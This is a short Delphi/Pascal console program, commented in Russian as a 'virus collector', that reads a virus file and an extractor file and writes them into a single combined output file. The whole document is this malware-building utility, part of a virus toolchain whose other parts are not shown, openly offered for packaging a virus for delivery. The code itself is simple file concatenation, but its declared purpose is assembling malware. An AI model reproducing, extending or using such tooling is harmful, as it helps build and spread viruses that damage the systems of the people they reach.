{
 ****************************************************************************
 Сборщик вируса, собирает вирус и экстрактор в один файл:
          ИСПОЛЬЗОВАНИЕ:
                        [сборщик] [вирус] [экстрактор] [имя собранного файла]
 ****************************************************************************
}
{$apptype console}
program Collector;
uses
  windows;

const
      {$i size.inc}
var fto1,Fto:file;
    filesize:integer;
    vir:array[0..virussize]of byte;
    rtf:array[0..ExtrSize]of byte;
procedure collect;
begin
     filemode:=0;
     assign(fto,paramstr(1));
     reset(fto,1);
     blockRead(fto,Vir,virussize);
     closefile(fto);
     assign(fto,paramstr(2));
     reset(fto,1);
     blockRead(fto,rtf,ExtrSize);
     close(fto);
     filemode:=1;
     assign(fto,paramstr(3));
     rewrite(fto,1);
     BlockWrite(fto,vir,virussize);
     seek(fto,virussize);
     BlockWrite(fto,Rtf,ExtrSize);
     closefile(fto);
end;
begin
writeln('For help enter collect.exe /help');
if Paramstr(1)='/help'
then
begin
    writeln(' [Virus] [Extractor] New file with Extractor And Virus');
end
else
begin
    collect;
end;
end.

